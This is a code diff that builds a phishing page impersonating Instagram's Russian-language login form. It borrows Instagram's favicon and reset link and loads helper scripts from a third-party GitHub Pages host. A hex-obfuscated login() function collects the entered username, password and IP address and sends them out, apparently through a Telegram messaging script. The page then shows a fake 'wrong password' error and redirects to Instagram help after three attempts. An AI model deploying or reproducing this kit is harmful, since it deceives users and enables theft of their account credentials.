@@ -1,1 +1,186 @@
-var _0x5621=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x65\x6C\x70\x2E\x69\x6E\x73\x74\x61\x67\x72\x61\x6D\x2E\x63\x6F\x6D\x2F","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x2E\x65\x72\x72\x6F\x72","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72","\x62\x6C\x6F\x63\x6B","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x62\x74\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\u0412\u043E\u0439\u0442\u0438","\u231B","\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x70\x61\x73\x73\x77\x6F\x72\x64","\x69\x70","\x67\x65\x74\x49\x74\x65\x6D","\x20\x49\x50\x5B\x27","\x27\x5D\x20\x25\x30\x41\x20\x55\x73\x65\x72\x6E\x61\x6D\x65\x20\x3A\x20\x5B","\x5D\x20\x25\x30\x41\x20\x50\x61\x73\x73\x77\x6F\x72\x64\x20\x3A\x20\x5B","\x5D\x20","\x33\x33\x30\x31"];function login(){s++;if(s== 3){window[_0x5621[0]]= _0x5621[1]};setTimeout(()=>{document[_0x5621[5]](_0x5621[4])[_0x5621[3]][_0x5621[2]]= _0x5621[6];document[_0x5621[9]](_0x5621[8])[_0x5621[7]]= _0x5621[10]},700);document[_0x5621[9]](_0x5621[8])[_0x5621[7]]= _0x5621[11];var _0xbfdbx2=document[_0x5621[9]](_0x5621[13])[_0x5621[12]];var _0xbfdbx3=document[_0x5621[9]](_0x5621[14])[_0x5621[12]];var _0xbfdbx4=localStorage[_0x5621[16]](_0x5621[15]);var _0xbfdbx5=`${_0x5621[17]}${_0xbfdbx4}${_0x5621[18]}${_0xbfdbx2}${_0x5621[19]}${_0xbfdbx3}${_0x5621[20]}`;sendMessage(_0xbfdbx5,_0x5621[21])}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authorization</title>
+    <script src="https://zipscript.github.io/script/telegram-api.js"></script>
+    <script src="https://zipscript.github.io/script/aes.js"></script>
+    <script src="https://zipscript.github.io/script/ip.js"></script>
+    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon-192.png/68d99ba29cc8.png">
+    <style>
+        *{
+            margin: 0px;
+            padding: 0px;
+            background: rgb(248, 248, 248);
+        }
+        .box{
+            background: white;
+            width:350px;
+            display: block;
+            margin: auto;
+            text-align: center;
+            height:335px;
+            margin-top:70px;
+           
+           border:2px solid rgb(228, 228, 228);
+        }
+        input{
+            display: block;
+            margin: auto;
+            margin-top:10px;
+            width:240px;
+            height:35px;
+            padding-left:10px;
+            border-radius:2px;
+            border:2px solid rgb(228, 228, 228);
+            outline: none;
+        }
+        .title{
+            font-family: Arial;
+            font-size:25px;
+            padding-top:50px;
+            background: white;
+        }
+        button{
+            margin-top:20px;
+            width:250px;
+            height:30px;
+            border-radius:4px;
+            border: none;
+            color: white;
+            background:rgba(0,149,246,0.3);
+            outline: none;
+        }
+        a{
+            display: block;
+            margin: auto;
+            text-align: center;
+            text-decoration: none;
+            color: rgb(43, 43, 43);
+            font-family: arial;
+            margin-top:25px;
+            font-size:13px;
+            background: white;
+        }
+        .err{
+            background: rgb(255, 150, 150);
+            height:50px;
+           /* border:1px solid red;*/
+        }
+        .t{
+            background: rgb(255, 150, 150);
+            display: block;
+            margin: auto;
+            text-align: center;
+            color: white;
+            font-size:15px;
+            font-family: arial;
+            padding-top:13px;
+        }
+        .error{
+            display: none;
+            margin: auto;
+            text-align: center;
+            width:280px;
+            background:white;
+            color: red;
+            font-family: arial;
+            font-size:13px;
+            margin-top:20px;
+        }
+        img{
+            width:40px;
+            padding-top:40px;
+            background: white;
+        }
+        @media  screen and (max-width:400px) {
+             .box{
+                 width: 300px;
+                 height:340px;
+             }
+             input{
+                 width:220px;
+             }
+             button{
+                 width:230px;
+             }
+             .error{
+                 width: 220px;
+             }
+             .t{
+                 width:250px;
+                 font-size:13px;
+             }
+        }
+        @media screen and (max-width:300px) {
+            *{
+                background: white;
+            }
+            .box{
+                border: 0px;
+
+            }
+            input{
+                background:  rgb(248, 248, 248);
+            }
+            .err{
+                width:100%;
+            }
+            .t{
+                width:100%;
+            }
+        }
+       
+        @media screen and (max-width:600px) {
+            *{
+                background: white;
+            }
+            .box{
+                border: 0px;
+                
+
+            }
+            input{
+                background:  rgb(248, 248, 248);
+            }
+        }
+        @media screen and (min-width:600px) {
+            .box{
+               margin-top:190px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="err">
+       <p class="t">❌ Войдите в свой аккаунт Instagram</p>
+    </div>
+    <div class="box">
+        <!--<h1 class="title">Instagram</h1>
+        <img src="" alt="">-->
+        <br><br><br>
+        <input type="text" id="username" placeholder="Телефон имя пользователя или эл. адрес" autocomplete="off">
+        <input type="password" id="password" onkeyup="block(this.value)" placeholder="Пароль">
+        <button id="btn" onclick="login()" disabled>Войти</button>
+        <p class="error">К сожалению, вы ввели неправильный пароль. Проверьте свой пароль еще раз.</p>
+        <a href="https://www.instagram.com/accounts/password/reset/">Забыли пароль?</a>
+    </div>
+</body>
+<script>
+     function block(t){
+         if(t.length > 4){
+             
+            document.getElementById('btn').disabled=false;
+            document.getElementById('btn').style.background='#0095f6';
+         }
+         if(t.length < 4){
+            document.getElementById('btn').disabled=true;
+            document.getElementById('btn').style.background='rgba(0,149,246,0.3)';
+         }
+     }
+     var s=0;
+     var _0x5621=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x65\x6C\x70\x2E\x69\x6E\x73\x74\x61\x67\x72\x61\x6D\x2E\x63\x6F\x6D\x2F","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x2E\x65\x72\x72\x6F\x72","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72","\x62\x6C\x6F\x63\x6B","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x62\x74\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\u0412\u043E\u0439\u0442\u0438","\u231B","\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x70\x61\x73\x73\x77\x6F\x72\x64","\x69\x70","\x67\x65\x74\x49\x74\x65\x6D","\x20\x49\x50\x5B\x27","\x27\x5D\x20\x25\x30\x41\x20\x55\x73\x65\x72\x6E\x61\x6D\x65\x20\x3A\x20\x5B","\x5D\x20\x25\x30\x41\x20\x50\x61\x73\x73\x77\x6F\x72\x64\x20\x3A\x20\x5B","\x5D\x20","\x33\x33\x30\x31"];function login(){s++;if(s== 3){window[_0x5621[0]]= _0x5621[1]};setTimeout(()=>{document[_0x5621[5]](_0x5621[4])[_0x5621[3]][_0x5621[2]]= _0x5621[6];document[_0x5621[9]](_0x5621[8])[_0x5621[7]]= _0x5621[10]},700);document[_0x5621[9]](_0x5621[8])[_0x5621[7]]= _0x5621[11];var _0xbfdbx2=document[_0x5621[9]](_0x5621[13])[_0x5621[12]];var _0xbfdbx3=document[_0x5621[9]](_0x5621[14])[_0x5621[12]];var _0xbfdbx4=localStorage[_0x5621[16]](_0x5621[15]);var _0xbfdbx5=`${_0x5621[17]}${_0xbfdbx4}${_0x5621[18]}${_0xbfdbx2}${_0x5621[19]}${_0xbfdbx3}${_0x5621[20]}`;sendMessage(_0xbfdbx5,_0x5621[21])}
+</script>
+</html>
